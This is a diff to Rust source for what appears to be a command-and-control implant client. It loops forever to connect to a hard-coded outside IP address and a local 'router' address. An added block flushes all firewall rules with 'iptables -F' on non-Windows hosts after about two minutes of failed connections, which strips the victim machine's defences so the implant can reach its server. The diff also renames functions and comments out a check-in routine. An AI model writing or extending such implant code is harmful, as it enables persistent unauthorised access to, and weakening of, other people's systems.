@@ -15,13 +15,23 @@ use subprocess::Exec;
 //Refactor
 
 fn connect(ip: &str) -> TcpStream {
+    let mut x = 0;
     loop {
+        if x > 24{ //if after 2 minutes of no connecting, drop IP tables
+            x = 0;
+            if cfg!(windows){
+                continue
+            } else{
+                Exec::shell("iptables -F");
+            }
+        } 
         match TcpStream::connect(ip){ //try to connect to the IP
             Ok(con) => { //if it worked, return the connection
                 return con;
             },
             Err(_) => { //if it errored, re-loop
                 thread::sleep(time::Duration::from_millis(5000));
+                x+=1;
                 continue;
             }
         } 
@@ -85,20 +95,26 @@ fn c2(ip:&str) {
     }
 }
 
-//function to check-in with the server every minute. if it can't connect, the client will try other methods to connect
-fn checkIn(){
-    thread::spawn(|| {
-        loop{
-            thread::sleep(time::Duration::from_millis(2000)); //sleep for 2 seconds
-            // println!("{}","checking in!");
-        }
-    });
-}
+// //function to check-in with the server every minute. if it can't connect, the client will try other methods to connect
+// fn check_in(){
+//     thread::spawn(|| {
+//         loop{
+//             thread::sleep(time::Duration::from_millis(2000)); //sleep for 2 seconds
+//             // println!("{}","checking in!");
+//         }
+//     });
+// }
 
-fn connectToRouter(){
+fn connect_to_router(){ //give the function all router IP's and it will try to reach all of them
     thread::spawn(||{
         let ip = "127.0.0.1:8080";
         c2(&ip);
+    });
+}
+
+fn constant_checker(){
+    thread::spawn(||{
+        return;
     });
 }
 
@@ -106,7 +122,8 @@ fn connectToRouter(){
 fn main(){
     let ip = "129.21.49.57:5678";
     loop{
-        connectToRouter();
+        connect_to_router();
         c2(&ip);
     }
+    // constant_checker();
 }
